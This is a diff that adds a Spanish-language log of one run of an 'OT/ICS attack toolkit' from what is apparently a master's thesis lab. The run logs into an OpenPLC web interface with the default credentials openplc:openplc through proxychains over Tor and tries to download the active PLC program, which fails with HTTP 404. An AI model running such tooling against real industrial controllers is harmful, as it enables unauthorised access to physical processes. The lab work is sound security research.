@@ -1,0 +1,39 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - Lectura del programa activo
+======================================================================
+  Fecha      : 2026-10-12 13:00:52
+  Objetivo   : 192.168.10.10:8080 (openplc:openplc)
+  MITRE ICS  : T0888, T0845
+======================================================================
+$ proxychains python3 -m modules._cli.openplc_cli get_current_program --target 192.168.10.10 --port 8080 --user openplc --password openplc
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 302
+[+] Sesión establecida.
+[*] GET http://192.168.10.10:8080/dashboard  (para localizar el programa activo)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+    -> Programa activo (según /dashboard): 'SensoresModbus'
+[*] GET http://192.168.10.10:8080/programs
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+    (HTML volcado a /ataques/work/debug_192.168.10.10_1791810054_programs.html)
+    (HTML volcado a /ataques/work/debug_192.168.10.10_1791810054_dashboard.html)
+
+    Ref                  | Name                | Description          | File                   | Fecha        | Activo
+    ---------------------+---------------------+----------------------+------------------------+--------------+-------
+    programa_sensores.st | SensoresModbus      |                      | programa_sensores.st   | Oct 12, 2026 |   *
+
+[+] Programa activo: 'SensoresModbus' (fichero='programa_sensores.st')
+[*] GET http://192.168.10.10:8080/st-files/programa_sensores.st
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 404 (207 bytes)
+[*] GET http://192.168.10.10:8080/program-page?file=programa_sensores.st  (fallback: parsear <textarea editor_data>)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 404
+[-] No se pudo descargar el .st del programa activo.
+[=] Código de salida: 0
